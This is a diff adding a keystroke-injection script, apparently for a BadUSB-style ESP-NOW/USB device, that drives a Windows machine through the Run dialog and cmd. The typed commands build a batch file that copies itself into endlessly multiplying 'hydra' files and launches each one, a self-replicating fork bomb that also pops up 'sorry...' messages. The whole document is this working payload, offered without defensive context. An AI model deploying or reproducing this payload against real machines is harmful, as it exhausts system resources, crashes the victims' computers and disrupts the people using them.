@@ -1,0 +1,25 @@
+/espnow cmd /usb GUI r
+/usb DELAY 1000
+/espnow cmd /usb STRING cmd
+/usb DELAY 500
+/espnow cmd /usb ENTER
+/usb DELAY 1000
+/espnow cmd /usb STRING echo @echo off > c.bat 
+/espnow cmd /usb STRING && echo set name=%0 >> c.bat 
+/espnow cmd /usb STRING && echo set hydra=1 >> c.bat 
+/espnow cmd /usb STRING && echo :start >> c.bat 
+/espnow cmd /usb STRING && echo :hydra >> c.bat 
+/espnow cmd /usb STRING && echo If not exist hydra%hydra%.bat 
+/espnow cmd /usb STRING ( >> c.bat && echo copy "%name%" 
+/espnow cmd /usb STRING "hydra%hydra%.bat" >> c.bat 
+/espnow cmd /usb STRING && echo ) else ( >> c.bat 
+/espnow cmd /usb STRING && echo set /a hydra=%hydra%+1 >> c.bat 
+/espnow cmd /usb STRING && echo GoTo hydra >> c.bat && echo ) >> c.bat 
+/espnow cmd /usb STRING && msg * sorry... >> c.bat 
+/espnow cmd /usb STRING && echo start %name% >> c.bat 
+/espnow cmd /usb STRING && echo start hydra%hydra%.bat >> c.bat 
+/espnow cmd /usb STRING && echo GoTo start >> c.bat 
+/espnow cmd /usb STRING && echo pause >> c.bat 
+/espnow cmd /usb STRING && cmd /c "c.bat"
+/usb DELAY 1000
+/espnow cmd /usb ENTER
